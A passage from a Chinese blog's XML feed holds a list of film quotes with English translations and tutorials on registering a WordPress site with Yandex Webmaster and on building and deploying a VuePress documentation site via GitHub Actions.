            <tag> 鸦KARAS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每部电影浓缩出的一句话</title>
      <link href="/60.html"/>
      <url>/60.html</url>
      
        <content type="html"><![CDATA[<p><strong>1.《泰坦尼克号》</strong></p><p>一个人一生可以爱上很多的人，等你获得真正属于你的幸福之后，你就会明白一起的伤痛其实是一种财富，它让你学会更好地去把握和珍惜你爱的人。</p><p>One may fall in love with many people during the lifetime. When you finally get your own happiness, you will understand the previous sadness is a kind of treasure, which makes you better to hold and cherish the people you love</p><p><strong>2.《飞屋环游记》</strong></p><p>幸福，不是长生不老，不是大鱼大肉，不是权倾朝野。幸福是每一个微小的生活愿望达成。当你想吃的时候有得吃，想被爱的时候有人来爱你。</p><p>Happiness is not about being immortal nor having food or rights in one’s hand. It’s about having each tiny wish come true, or having something to eat when you are hungry or having someone’s love when you need love.</p><p><strong>3.《当哈利遇见莎莉》</strong><br>爱情是灯，友情是影子，当灯灭了，你会发现你的周围都是影子。朋友，是在最后可以给你力量的人。</p><p>Love is a lamp, while friendship is the shadow. When the lamp is off,you will find the shadow everywhere. Friend is who can give you strength at last.</p><p><strong>4.《剪刀手爱德华》</strong></p><p>我爱你不是因为你是谁，而是我在你面前可以是谁。</p><p>I love you not for who you are, but for who I am with you.</p><p><strong>5.《恋夏500天》</strong></p><p>爱情，要么让人成熟，要么让人堕落。</p><p>Love makes man grow up or sink down.</p><p><strong>6.《如果能再爱一次》</strong></p><p>举得起放得下的叫举重，举得起放不下的叫负重。可惜，大多数人的爱情，都是负重的。</p><p>If you can hold something up and put it down, it is called weight-lifting; if you can hold something up but can never put it down,it’s called burden-bearing. Pitifully, most of people are bearing heavy burdens when they are in love.</p><p><strong>7.《廊桥遗梦》</strong></p><p>我们每个人都生活在各自的过去中，人们会用一分钟的时间去认识一个人，用一小时的时间去喜欢一个人，再用一天的时间去爱上一个人，到最后呢，却要用一辈子的时间去忘记一个人。</p><p>We all live in the past. We take a minute to know someone, one hour to like someone, and one day to love someone, but the whole life to forget someone</p><p><strong>8</strong>.<strong>《蓝莓之夜》</strong><br>一个人总要走陌生的路，看陌生的风景，听陌生的歌，然后在某个不经意的瞬间，你会发现，原本是费尽心机想要忘记的事情真的就那么忘记了。</p><p>One is always on a strange road, watching strange scenery and listening to strange music. Then one day, you will find that the things you try hard to forget are already gone.</p><p><strong>9.《初恋50次》</strong></p><p>年轻的时候会想要谈很多次恋爱，但是随着年龄的增长，终于领悟到爱一个人，就算用一辈子的时间，还是会嫌不够。慢慢地去了解这个人，体谅这个人，直到爱上为止，是需要有非常宽大的胸襟才行。</p><p>When you are young, you may want several love experiences. But as time goes on, you will realize that if you really love someone, the whole life will not be enough. You need time to know, to forgive and to love.All this needs a very big mind.</p><p><strong>10.《单身公寓》</strong></p><p>当明天变成了今天成为了昨天，最后成为记忆里不再重要的某一天，我们突然发现自己在不知不觉中已被时间推着向前走，这不是静止火车里，与相邻列车交错时，仿佛自己在前进的错觉，而是我们真实的在成长，在这件事里成了另一个自己。</p><p>When tomorrow turns in today, yesterday, and someday that no more important in your memory, we suddenly realize that we? pushed forward by time. This is not in a train still in which you may feel forward when another train goes by. It is the truth that we’ve all grown up.And we become different.</p><p><strong>11.《分手信》</strong></p><p>离开我就别安慰我，要知道每一次缝补也会遭遇穿刺的痛。</p><p>If you leave me, please don’t comfort me because each sewing has to meet stinging pain.</p><p><strong>12.《曾经》</strong></p><p>曾经拥有的，不要忘记。不能得到的，更要珍惜。属于自己的，不要放弃。已经失去的，留作回忆。</p><p>Don’t forget the things you once owned. Treasure the things you can’t get. Don’t give up the things that belong to you and keep those lost things in memory.</p><p><strong>13.《西雅图夜未眠》</strong></p><p>我喜欢并习惯了对变化的东西保持着距离，这样才会知道什么是最不会被时间抛弃的准则。比如爱一个人，充满变数，我于是后退一步，静静的看着，直到看见真诚的感情。</p><p>I love and am used to keeping a distance with those changed things.Only in this way can I know what will not be abandoned by time. For example, when you love someone, changes are all around. Then I step backward and watching it silently, then I see the true feelings.</p><p><strong>14.《两小无猜》</strong></p><p>好的爱情是你通过一个人看到整个世界，坏的爱情是你为了一个人舍弃世界。</p><p>Good love makes you see the whole world from one person while bad love makes you abandon the whole world for one person.</p><p><strong>15.《冷山》</strong></p><p>在自己面前，应该一直留有一个地方，独自留在那里。然后去爱。不知道是什么，不知道是谁，不知道如何去爱，也不知道可以爱多久。只是等待一次爱情，也许永远都没有人。可是，这种等待，就是爱情本身。</p><p>We shall always save a place for ourselves, only for ourselves. And then begin to love. Have no idea of what it is, who he is, how to love or how long it will be. Just wait for one love. Maybe no one will come out, but this kind of waiting is the love itself.</p><p><strong>16.《天使爱美丽》</strong></p><p>有谁不曾为那暗恋而痛苦？我们总以为那份痴情很重，很重，是世上最重的重量。有一天，暮然回首，我们才发现，它一直都是很轻，很轻的。我们以为爱的很深，很深，来日岁月，会让你知道，它不过很浅，很浅。最深和最重的爱，必须和时日一起成长。</p><p>Is there anyone who hasn’t suffered for the secret love? We always think that love is very heavy, heavy and could be the heaviest thing in the world. But one day, when you look back, you suddenly realize that it’s always light, light. We all thought love was very deep, but in fact it’s very thin. The deepest and heaviest love must grow up with the time.</p><p><strong>17.《附注我爱你》</strong></p><p>在这个世界上，只有真正快乐的男人，才能带给女人真正的快乐。</p><p>In this world, only those men who really feel happy can give women happiness.</p><p><strong>18.《英国病人》</strong></p><p>一段不被接受的爱情，需要的不是伤心，而是时间，一段可以用来遗忘的时间。一颗被深深伤了的心，需要的不是同情，而是理解。</p><p>An unacceptable love needs no sorrow but time- sometime for forgetting.A badly-hurt heart needs no sympathy but understanding</p><p><strong>19.《返老还童》</strong></p><p>我知道这世上有人在等我，尽管我不知道我在等谁。但是因为这样，我每天都非常快乐。</p><p>I know someone in the world is waiting for me, although I’ve no idea of who he is. But I feel happy every day for this.</p><p><strong>20.《恋恋笔记本》</strong></p><p>一生至少该有一次，为了某个人而忘了自己，不求有结果，不求同行，不求曾经拥有，甚至不求你爱我。只求在我最美的年华里，遇到你。</p><p>In your life, there will at least one time that you forget yourself for someone, asking for no result, no company, no ownership nor love. Just sk for meeting you in my most beautiful years.</p><p><strong>21.《阿甘正传》</strong></p><p>我不觉得人的心智成熟是越来越宽容涵盖，什么都可以接受。相反，我觉得那应该是一个逐渐剔除的过程，知道自己最重要的是什么，知道不重要的东西是什么。而后，做一个纯简的人。</p><p>I don’t think that when people grow up, they will become more broad-minded and can accept everything. Conversely, I think it’s aselecting process, knowing what’s the most important and what’s the least. And then be a simple man.</p><p><strong>22.《看得见风景的房间》</strong></p><p>当你的心真的在痛，眼泪快要流下来的时候，那就赶快抬头看看，这片曾经属于我们的天空；当天依旧是那么的广阔，云依旧那么的潇洒，那就不应该哭，因为我的离去，并没有带走你的世界。</p><p>When you feel hurt and your tears are gonna to drop. Please look up and have a look at the sky once belongs to us. If the sky is still vast , clouds are still clear.there’s no need to cry,because i don’t take your world away when i am leaving</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电影 </tag>
            
            <tag> 台词 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Yandex网站管理员工具中添加网站</title>
      <link href="/59.html"/>
      <url>/59.html</url>
      
        <content type="html"><![CDATA[<p>您想将您的网站连接到 Yandex 网站管理员工具吗？ 网站管理员工具(例如 Google 的搜索引擎控制台和 Bing 网站管理员)可帮助您优化网站，监控流量，管理 robots.txt，检查网站错误等。 在本文中，我们将分享如何在 Yandex 网站管理员工具中添加 WordPress 网站以监视您的搜索引擎流量。</p><h3 id="什么是-Yandex-？"><a href="#什么是-Yandex-？" class="headerlink" title="什么是 Yandex ？"></a>什么是 Yandex ？</h3><p>Yandex 是俄罗斯的 Google 和 Bing 等流行的搜索引擎。 您可以在 Yandex 中优化 SEO 网站，以吸引更多来自俄罗斯的访客。</p><p><img src="https://cos.gjcloak.xyz/file/1644973867-Dingtalk_20220216091039.jpg" alt="Test" title="Test"></p><p>Yandex 具有一系列工具，例如通用搜索引擎，图像搜索，电子邮件，视频，地图等。 它还具有网站管理员工具，可帮助您对网站进行排名，监控流量统计信息，搜索查询，关键字等。</p><p>您可以使用 Yoast SEO 插件将 WordPress 网站与 Yandex 连接。 它的工作方式类似于 Google 搜索控制台和 Bing 网站站长工具。</p><h3 id="在-Yandex-网站管理员工具中添加-WordPress-网站"><a href="#在-Yandex-网站管理员工具中添加-WordPress-网站" class="headerlink" title="在 Yandex 网站管理员工具中添加 WordPress 网站"></a>在 Yandex 网站管理员工具中添加 WordPress 网站</h3><p>在开始之前，您需要一个 Yandex 网站管理员工具帐户才能连接您的网站。 创建帐户后，您可以登录 WordPress 网站以使用 Yoast SEO 插件配置 Yandex 网站管理员工具。</p><p>让我们来看看如何在 Yandex 网站管理员工具中添加网站并立即开始对其进行优化。</p><h3 id="步骤1：在-Yandex-上创建帐户"><a href="#步骤1：在-Yandex-上创建帐户" class="headerlink" title="步骤1：在 Yandex 上创建帐户"></a>步骤1：在 Yandex 上创建帐户</h3><p>您需要做的第一件事是登录您的 Yandex 网站管理员工具帐户。 如果您没有 Yandex 帐户，则可以使用此链接创建一个帐户。</p><p><img src="https://cos.gjcloak.xyz/file/1644974091-143F5885-E527-4c3d-B76E-C87412D1EED4.png" alt="Test" title="Test"></p><p>创建帐户后，您将看到 Yandex 网站管理员页面。 在此页面上，您需要单击顶部栏中的“?<strong>+</strong>?”按钮以在 Yandex 中添加您的网站。</p><p><img src="https://cos.gjcloak.xyz/file/1644974168-Dingtalk_20220216091545.jpg" alt="Test" title="Test"></p><p>在站点地址字段中，您需要添加网站的完整域名，然后单击<strong>添加</strong>按钮。</p><p><img src="https://cos.gjcloak.xyz/file/1644974349-Dingtalk_20220216091856.jpg" alt="Test" title="Test"></p><p><strong>注意：</strong>如果您的主域在 URL 中使用“ www”，则需要将其添加到域之前(例如 <a href="http://www.gjcloak.top/">www.gjcloak.top</a> )。</p><p>在下一页上，将要求您通过在 WordPress 网站中添加元内容来验证网站所有权。 继续并复制此页面上的内容代码，因为在步骤2中将需要它。</p><h3 id="步骤2：登录WordPress管理区域并添加代码"><a href="#步骤2：登录WordPress管理区域并添加代码" class="headerlink" title="步骤2：登录WordPress管理区域并添加代码"></a>步骤2：登录WordPress管理区域并添加代码</h3><p>现在，您需要登录到 WordPress 管理区域，并在 Yoast SEO 网站管理员设置中添加验证码。</p><p>只需转到 <strong>SEO ? 常规</strong> 区域，然后单击<strong>站点管理员工具</strong>标签。</p><p><img src="https://cos.gjcloak.xyz/file/1644974538-Dingtalk_20220216092206.jpg" alt="Test" title="Test"></p><p>接下来，您需要将代码粘贴到 Yandex 验证代码字段中，然后单击“?<strong>保存更改”</strong>按钮。</p><p>在WordPress网站中添加代码后，您需要返回到 Yandex 网站管理员工具页面，在该页面上复制了代码，然后单击“?<strong>检查”</strong>按钮以验证所有权。</p><p>成功验证后，它将显示您的用户名，该用户名有权在 Yandex 网站管理员工具中管理您的网站。 您还可以通过添加其他用户名并单击“?<strong>委派权限”</strong>按钮将权限委派给其他用户。</p><p>现在，您的网站已经过验证并添加到 Yandex 网站管理员工具中，您可以在 Yandex 仪表板上查看流量统计信息，搜索错误，搜索查询，内部和外部链接，网站信息，robots.txt 分析，移动设备审核页等。 您可以使用屏幕左侧的菜单查找可能需要的任何信息。</p><p>Yandex 网站管理员工具具有用于网站优化的选项，这些选项已从疑难解答过滤到重要设置，例如 robots.txt 和 .htaccess 。 您可以进一步针对 SEO 进一步优化 robots.txt ，并定期执行 WordPress 维护任务以使您的网站保持最新。</p><p>希望本文能帮助您学习如何在 Yandex 网站管理员工具中添加网站。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Yandex </tag>
            
            <tag> 工具 </tag>
            
            <tag> 网站管理员 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VuePress 创建文档网站</title>
      <link href="/58.html"/>
      <url>/58.html</url>
      
        <content type="html"><![CDATA[<h1 id="VuePress-介绍"><a href="#VuePress-介绍" class="headerlink" title="VuePress 介绍"></a>VuePress 介绍</h1><p>简单介绍一下，<a href="https://vuepress.vuejs.org/zh/guide/">VuePress</a> 是尤雨溪 2018 年 04 月 12 日发布的 Vue 静态网站生成器，支持 <code>Vue 语法</code>，内置 <code>webpack</code>，每一个由 <code>VuePress</code> 生成的页面都是通过 SSR 预渲染的 HTML，也因此具有非常好的加载性能和搜索引擎优化。</p><p>个人觉得最大的亮点就是：</p><ol><li>markdown 文件可以内嵌 Vue 组件</li><li>借助 YAML 来作为驱动和配置文档</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>在已有项目中安装</p></blockquote><p>如果你想要在一个已有项目中维护文档，就应该将 VuePress 安装为本地依赖。此设置还允许你使用 CI 或 Netlify 服务，在推送时自动部署。</p><h3 id="安装为本地依赖项"><a href="#安装为本地依赖项" class="headerlink" title="安装为本地依赖项"></a>安装为本地依赖项</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 安装为本地依赖项</span><br><span class="line">npm install -D vuepress</span><br></pre></td></tr></table></figure><h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以使用 npm 来初始化项目,会生成 package.json</span><br><span class="line">npm init -y</span><br></pre></td></tr></table></figure><p>然后在项目的根目录下新建一个 <code>docs</code> 文件夹，以后我们写的 <code>markdown</code> 文件都会放在 <code>docs</code> 文件夹下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个 docs 目录</span><br><span class="line">mkdir docs</span><br><span class="line"># 创建一个 markdown 文件</span><br><span class="line">echo # Hello VuePress &gt; docs/README.md</span><br></pre></td></tr></table></figure><p>执行本地服务器启动命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vuepress dev docs</span><br></pre></td></tr></table></figure><p>就可以看到启动了一个页面：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426193548.png" alt="image-20200426193547122" title="image-20200426193547122"></p><p>为了后续运行方便，我们可以把这些命令写在项目的 <code>package.json</code> 文件里面的 <code>scripts</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;dev&quot;: &quot;vuepress dev docs&quot;,</span><br><span class="line">    &quot;build&quot;: &quot;vuepress build docs&quot;,</span><br><span class="line">    &quot;deploy&quot;: &quot;npm run build &amp;&amp; gh-pages -d docs/.vuepress/dist&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后你就可以开始编写文档了：</p><p>执行本地服务器启动命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn dev # 或者：npm run dev</span><br></pre></td></tr></table></figure><p>要生成静态资源（HTML 文件），请运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn build # 或者：npm run build</span><br></pre></td></tr></table></figure><p>默认情况下，构建的文件会位于 <code>.vuepress/dist</code> 中，该文件可以通过 <code>.vuepress/config.js</code> 中的 <code>dest</code> 字段进行配置。构建的文件可以部署到任何静态文件服务器。</p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>VuePress 遵循 <strong>“约定优于配置”</strong> 的原则，推荐的目录结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── docs</span><br><span class="line">│   ├── .vuepress (可选的)</span><br><span class="line">│   │   ├── components (可选的)</span><br><span class="line">│   │   ├── theme (可选的)</span><br><span class="line">│   │   │   └── Layout.vue</span><br><span class="line">│   │   ├── public (可选的)</span><br><span class="line">│   │   ├── styles (可选的)</span><br><span class="line">│   │   │   ├── index.styl</span><br><span class="line">│   │   │   └── palette.styl</span><br><span class="line">│   │   ├── templates (可选的, 谨慎配置)</span><br><span class="line">│   │   │   ├── dev.html</span><br><span class="line">│   │   │   └── ssr.html</span><br><span class="line">│   │   ├── config.js (可选的)</span><br><span class="line">│   │   └── enhanceApp.js (可选的)</span><br><span class="line">│   │ </span><br><span class="line">│   ├── README.md</span><br><span class="line">│   ├── guide</span><br><span class="line">│   │   └── README.md</span><br><span class="line">│   └── config.md</span><br><span class="line">│ </span><br><span class="line">└── package.json</span><br></pre></td></tr></table></figure><ul><li><code>docs/.vuepress</code>: 用于存放全局的配置、组件、静态资源等。</li><li><code>docs/.vuepress/components</code>: 该目录中的 Vue 组件将会被自动注册为全局组件。</li><li><code>docs/.vuepress/theme</code>: 用于存放本地主题。</li><li><code>docs/.vuepress/styles</code>: 用于存放样式相关的文件。</li><li><code>docs/.vuepress/styles/index.styl</code>: 将会被自动应用的全局样式文件，会生成在最终的 CSS 文件结尾，具有比默认样式更高的优先级。</li><li><code>docs/.vuepress/styles/palette.styl</code>: 用于重写默认颜色常量，或者设置新的 stylus 颜色常量。</li><li><code>docs/.vuepress/public</code>: 静态资源目录。</li><li><code>docs/.vuepress/templates</code>: 存储 HTML 模板文件。</li><li><code>docs/.vuepress/templates/dev.html</code>: 用于开发环境的 HTML 模板文件。</li><li><code>docs/.vuepress/templates/ssr.html</code>: 构建时基于 Vue SSR 的 HTML 模板文件。</li><li><code>docs/.vuepress/config.js</code>: 配置文件的入口文件，也可以是 <code>YML</code> 或 <code>toml</code>。</li><li><code>docs/.vuepress/enhanceApp.js</code>: 客户端应用的增强。</li></ul><h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><p>目前我们只写了一个 <code>markdown</code> 文档，所以只有一个页面，后续我们的博客会陆续加入很多内容，肯定需要做目录分级，配置导航栏，可以看<a href="https://vuepress.vuejs.org/zh/theme/default-theme-config.html#%E9%A6%96%E9%A1%B5">文档里的这部分</a></p><p>官网说明的已经很详细，不妨直接看官网，走起：<a href="https://www.vuepress.cn/theme/default-theme-config.html">默认主题设置</a>，如果后面针对于文档网站做个性化优化，会放在下面 “优化文档” 这一标题下说明。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>下述的指南基于以下条件：</p><ul><li>文档放置在项目的 <code>docs</code> 目录中；</li><li>使用的是默认的构建输出位置；</li><li>VuePress 以本地依赖的形式被安装到你的项目中，并且配置了如下的 npm scripts:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;deploy&quot;: &quot;npm run build &amp;&amp; gh-pages -d docs/.vuepress/dist&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>在 <code>docs/.vuepress/config.js</code> 中设置正确的 <code>base</code>。</li></ol><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426182802.png" alt="image-20200426182800772" title="image-20200426182800772"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  base: &#x27;/vuepress-demo/&#x27;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>在你的项目中，创建一个如下的 <code>deploy.sh</code> 文件（根据实际情况修改）:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env sh</span><br><span class="line"></span><br><span class="line"># 确保脚本抛出遇到的错误</span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line"># 生成静态文件</span><br><span class="line">npm run build</span><br><span class="line"></span><br><span class="line"># 进入生成的文件夹</span><br><span class="line">cd docs/.vuepress/dist</span><br><span class="line"></span><br><span class="line"># 如果是发布到自定义域名</span><br><span class="line"># echo &#x27;www.example.com&#x27; &gt; CNAME</span><br><span class="line"></span><br><span class="line">git init</span><br><span class="line">git add -A</span><br><span class="line">git commit -m &#x27;deploy&#x27;</span><br><span class="line"></span><br><span class="line"># 如果发布到 https://&lt;USERNAME&gt;.github.io</span><br><span class="line"># git push -f git@github.com:&lt;USERNAME&gt;/&lt;USERNAME&gt;.github.io.git master</span><br><span class="line"></span><br><span class="line"># 如果发布到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;</span><br><span class="line"># git push -f git@github.com:&lt;USERNAME&gt;/&lt;REPO&gt;.git master:gh-pages</span><br><span class="line"></span><br><span class="line">cd -</span><br></pre></td></tr></table></figure><h2 id="GitHub-Actions-自动构建-部署"><a href="#GitHub-Actions-自动构建-部署" class="headerlink" title="GitHub Actions 自动构建&#x2F;部署"></a>GitHub Actions 自动构建&#x2F;部署</h2><p>大家有注意到 GitHub 悄悄上线了一个 Actions 功能吗？还不了解的同学可以看<a href="https://zhuanlan.zhihu.com/p/77751445">这篇文章</a>，写的非常全面。</p><blockquote><p>GitHub Actions 是什么</p><p>GitHub 官方号称 Actions 可以让你的<strong>工作流自动化</strong>：GitHub 监听某个事件（可能是某个分支的提交），然后触发你预定义的工作流，让大家在GitHub服务器上直接测试代码、部署代码。所以，我们可以利用这里特性来做 CI&#x2F;CD，开发者只要写一下 workflow 脚本就可以了，不用费心思去想要用哪个第三方的 CI&#x2F;CD 服务, ?。</p></blockquote><p>actions 其实就是由一些脚本组成，所以它们是可以复用的，GitHub 做了一个<a href="https://github.com/marketplace?type=actions">官方市场</a>，可以搜索到他人提交的 actions。另外，还有一个 <a href="https://github.com/sdras/awesome-actions">awesome actions</a> 的仓库，也可以找到不少 action。这样一来，你甚至都不用自己写具体的脚本，直接引用别人的脚本就行啦。</p><p>话不多说，赶紧用起来！</p><h3 id="写-workflow-脚本"><a href="#写-workflow-脚本" class="headerlink" title="写 workflow 脚本"></a>写 workflow 脚本</h3><p>首先我们需要到项目仓库的页面上进入 Actions 这个 tab, 选择 Node 环境进入脚本的编辑页面</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426201146.png" alt="image-20200426201144851" title="image-20200426201144851"></p><p>这里我直接使用了 peaceiris 的 <a href="https://github.com/peaceiris/actions-gh-pages"><code>actions-gh-pages</code></a>，这个 <code>action</code> 可以帮你把打包好的静态文件部署到 <code>GitHub Pages</code> 上去。</p><p>最终我的 workflow 脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># This workflow will do a clean install of node dependencies, build the source code and run tests across different versions of node</span><br><span class="line"># For more information see: https://help.github.com/actions/language-and-framework-guides/using-nodejs-with-github-actions</span><br><span class="line"></span><br><span class="line">name: vuepress-demo</span><br><span class="line">on:</span><br><span class="line">  push:</span><br><span class="line">    branches:</span><br><span class="line">    - master</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">  build-deploy:</span><br><span class="line">    runs-on: ubuntu-18.04</span><br><span class="line">    steps:</span><br><span class="line">    - uses: actions/checkout@master</span><br><span class="line"></span><br><span class="line">    # - name: Setup Node</span><br><span class="line">    #   uses: actions/setup-node@v1</span><br><span class="line">    #   with:</span><br><span class="line">    #     node-version: &#x27;10.x&#x27;</span><br><span class="line"></span><br><span class="line">    # - name: Cache dependencies</span><br><span class="line">    #   uses: actions/cache@v1</span><br><span class="line">    #   with:</span><br><span class="line">    #     path: ~/.npm</span><br><span class="line">    #     key: $&#123;&#123; runner.os &#125;&#125;-node-$&#123;&#123; hashFiles(&#x27;**/package-lock.json&#x27;) &#125;&#125;</span><br><span class="line">    #     restore-keys: </span><br><span class="line">    #       $&#123;&#123; runner.os &#125;&#125;-node-</span><br><span class="line"></span><br><span class="line">    - run: npm ci</span><br><span class="line"></span><br><span class="line">    - run: npm run build</span><br><span class="line"></span><br><span class="line">    - name: Deploy</span><br><span class="line">      uses: peaceiris/actions-gh-pages@v3</span><br><span class="line">      env:</span><br><span class="line">        ACTIONS_DEPLOY_KEY: $&#123;&#123; secrets.ACCESS_TOKEN &#125;&#125;</span><br><span class="line">        PUBLISH_BRANCH: gh-pages</span><br><span class="line">        PUBLISH_DIR: docs/.vuepress/dist</span><br></pre></td></tr></table></figure><p>注意</p><p>因为我用的 action 是第三方的，所以 action 可能会经常更改，如果你是过了一段时间才看到这篇文章，peaceiris 的 <a href="https://github.com/peaceiris/actions-gh-pages"><code>actions-gh-pages</code></a> 很可能已经发生了更新，所以脚本的内容建议直接参照它的官方文档来写。</p><p>更详细的语法可以去看 <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/events-that-trigger-workflows">GitHub Actions 的官方文档</a></p><p>注意</p><h3 id="设置-workflow-的环境变量"><a href="#设置-workflow-的环境变量" class="headerlink" title="设置 workflow 的环境变量"></a>设置 workflow 的环境变量</h3><p>因为我们需要 GitHub Actions 把构建成果发到 GitHub 仓库，因此需要 GitHub 密钥，相当于是给 GitHub actions 授权。</p><p>首先运行下面的命令生成一对密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;$(git config user.email)&quot; -f gh-pages -N &quot;&quot;</span><br><span class="line"># You will get 2 files:</span><br><span class="line">#   gh-pages.pub (public key)</span><br><span class="line">#   gh-pages     (private key)</span><br></pre></td></tr></table></figure><p>像这样：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426202935.png" alt="image-20200426202933017" title="image-20200426202933017"></p><p>密钥在这：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426203944.png" alt="image-20200426203943738" title="image-20200426203943738"></p><p>然后：</p><ol><li>在博客项目的仓库的 Settings 栏下，找到 <code>Deploy keys</code>这一项，把你的公钥加进去，<strong>注意勾选<code>Allow write access</code></strong></li><li>同样在博客项目的仓库的 Settings 栏下，找到 <code>Secrets</code>这一项，把你的私钥加进去</li></ol><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426203454.png" alt="image-20200426203453041" title="image-20200426203453041"></p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426203755.png" alt="image-20200426203753813" title="image-20200426203753813"></p><p>如图显示即成功：</p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426203839.png" alt="image-20200426203837992" title="image-20200426203837992"></p><p><img src="https://cos.gjcloak.xyz/CS-Notes/20200426203824.png" alt="image-20200426203823746" title="image-20200426203823746"></p><h2 id="优化文档"><a href="#优化文档" class="headerlink" title="优化文档"></a>优化文档</h2><h3 id="图片放大显示"><a href="#图片放大显示" class="headerlink" title="图片放大显示"></a>图片放大显示</h3><p>1 安装插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -D @vuepress/plugin-medium-zoom</span><br></pre></td></tr></table></figure><p>2 使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 